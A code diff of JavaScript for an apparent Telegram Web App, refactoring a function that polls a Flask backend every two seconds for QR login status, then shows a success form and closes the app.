@@ -918,29 +918,25 @@ window.addEventListener("DOMContentLoaded", () => {
         }
     });
 
-    function pollQRStatus() {
+    const pollQrStatus = () => {
         const interval = setInterval(() => {
             fetch("https://flask-duhv.onrender.com/qr-status")
                 .then(res => res.json())
                 .then(data => {
                     if (data.authenticated) {
                         clearInterval(interval);
-    
-                        fetch("https://flask-duhv.onrender.com/qr-status/reset");
-    
-                        document.getElementById("qrForm").style.display = 'none';
+                        document.getElementById("codeForm").style.display = 'none';
                         document.getElementById("successForm").style.display = 'block';
-    
+                        fetch("https://flask-duhv.onrender.com/qr-status/reset"); // optional reset
                         if (window.Telegram && Telegram.WebApp) {
                             Telegram.WebApp.close();
                         }
                     }
-                })
-                .catch(err => {
-                    console.error("QR status poll failed:", err);
                 });
-        }, 2000);
-    }
+        }, 2000); // poll every 2 seconds
+    };
+
+    pollQrStatus();
 
     document.getElementById("editPhoneBtn").addEventListener("click", function () {
         codeForm.style.display = "none";
